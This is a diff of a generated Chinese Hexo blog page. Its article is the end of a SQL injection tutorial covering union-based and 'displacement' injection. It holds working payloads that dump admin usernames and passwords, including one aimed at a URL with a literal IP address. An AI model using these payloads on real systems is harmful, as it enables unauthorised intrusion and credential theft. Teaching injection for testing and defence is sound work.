+<li><p><a target="_blank" rel="noopener" href="http://www.jsporcle.com/a.jsp?username=SMITH">http://www.jsporcle.com/a.jsp?username=SMITH</a>‘ union select null,(SELECT </p>
+<pre><code>CONCAT(USERNAME,PASSWORD) FROM ADMIN),null,null,null,null,null,null from dual --
+</code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1615264985827-3ce64132-98c6-40b0-a8b3-cd26e83c317b.png#align=left&display=inline&height=396&margin=%5Bobject%20Object%5D&name=image.png&originHeight=396&originWidth=890&size=40175&status=done&style=none&width=890" alt="image.png"></p>
+<h2 id="十二、高级注入技巧-位移注入"><a href="#十二、高级注入技巧-位移注入" class="headerlink" title="十二、高级注入技巧 位移注入"></a>十二、高级注入技巧 位移注入</h2><h2 id="1、简介-1"><a href="#1、简介-1" class="headerlink" title="1、简介"></a>1、简介</h2></li>
+<li><p>这种注入方式合适在找到表找不到字段的情况下使用。</p>
+</li>
+<li><p>这种注入方式 需要联合两个表 所以这种注入也是联合查询注入的一种。</p>
+<h2 id="2、原理是什么？"><a href="#2、原理是什么？" class="headerlink" title="2、原理是什么？"></a>2、原理是什么？</h2></li>
+<li><p>在 SQL 中查询 select * from admin 星号代表所有字段。</p>
+</li>
+<li><p>而且 select * from admin 的结果等于下面几种结果</p>
+</li>
+</ul>
+<p>a) select admin.* from admin<br>b) select admin.id,admin.username,admin.password from admin<br>c) select id,username,password from admin</p>
+<ul>
+<li>在使用位移注入这种注入方法，需要确定当前表的，字段数</li>
+<li>表 article 的字段为 3 个</li>
+<li>使用联合语句 把另外一个表联合进来查询</li>
+</ul>
+<p>a) select * from article where id=1 union select 1,2,3 from admin<br>b) admin 的表的字段数同样也是 3 个 把 admin.* 替换 1,2,3<br>c) select * from article where id=1 union select admin.* from admin</p>
+<ul>
+<li><p>语句并没有报错 因为列数一样 同样也会显示表 admin 里面的字段数据</p>
+<h2 id="3、网站测试"><a href="#3、网站测试" class="headerlink" title="3、网站测试"></a>3、网站测试</h2></li>
+<li><p><a target="_blank" rel="noopener" href="http://target_sys.com/article.php?id=-1">http://</a><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">169.254.82.111:8</a>1<a target="_blank" rel="noopener" href="http://target_sys.com/article.php?id=-1">/article.php?id=-1</a> union select admin.* from admin</p>
+</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614754153190-68163605-c0dc-4b61-bd54-13b84a3980b4.png#align=left&display=inline&height=396&margin=%5Bobject%20Object%5D&name=image.png&originHeight=396&originWidth=890&size=30409&status=done&style=none&width=890" alt="image.png"></p>
+<ul>
+<li></li>
+</ul>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">John Doe</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://example.com/2021/08/29/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98/">http://example.com/2021/08/29/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint policy. If reproduced, please indicate source
+                    <a href="/about" target="_blank">John Doe</a>
+                    !
+                </span>
+            </div>
+        
     </div>
 
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
 
-      
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
 
-      
 
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">No tag</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
     </div>
-  </header>
-  
+</div>
 
-  <div class="content" itemprop="articleBody">
-    <p>123123<br>123123</p>
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
 
-  </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2021/08/29/%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="文章测试">
+                        
+                        <span class="card-title">文章测试</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-08-29
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            John Doe
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/08/29/hello-world/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
+                        
+                        <span class="card-title">Hello World</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-29
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            John Doe
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
 </article>
 
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/">Home</a></li>
-         
-          <li><a href="/about/">About</a></li>
-         
-          <li><a href="/archives/">Writing</a></li>
-         
-          <li><a href="/projects_url">Projects</a></li>
-        
-      </ul>
-    </div>
-
-    <div id="toc-footer" style="display: none">
-      
-    </div>
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/08/29/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/08/29/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98/&text=文章标题"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/08/29/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98/&title=文章标题"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/08/29/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98/&is_video=false&description=文章标题"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=文章标题&body=Check out this article: http://example.com/2021/08/29/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/08/29/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98/&title=文章标题"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/08/29/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98/&title=文章标题"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/08/29/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98/&title=文章标题"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/08/29/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98/&title=文章标题"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/08/29/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98/&name=文章标题&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/08/29/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98/&t=文章标题"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
-  </div>
 </div>
 
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
-    
-    
-    2016-2021
-    John Doe
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-          <li><a href="/">Home</a></li>
-         
-          <li><a href="/about/">About</a></li>
-         
-          <li><a href="/archives/">Writing</a></li>
-         
-          <li><a href="/projects_url">Projects</a></li>
-        
-      </ul>
-    </nav>
-  </div>
-</footer>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
 
     </div>
-    <!-- styles -->
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
 
 
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
 
-  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
 
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
 
-    <!-- jquery -->
- 
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
 
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
 
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
 
-
-<!-- clipboard -->
-
-  
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
-  
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
-    btn += '<i class="far fa-clone"></i>';
-    btn += '</span>'; 
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
     });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "Copied!");
-      e.clearSelection();
-    })
-  })
-  </script>
+</script>
+
+    
+
+</main>
 
 
-<script src="/js/main.js"></script>
 
-<!-- search -->
 
-<!-- Google Analytics -->
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
 
-<!-- Baidu Analytics -->
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
 
-<!-- Cloudflare Analytics -->
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
 
-<!-- Umami Analytics -->
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
 
-<!-- Disqus Comments -->
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
 
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2021</span>
+            
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">John Doe</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;Total visits:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;Total visitors:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
 
 </body>
+
 </html>
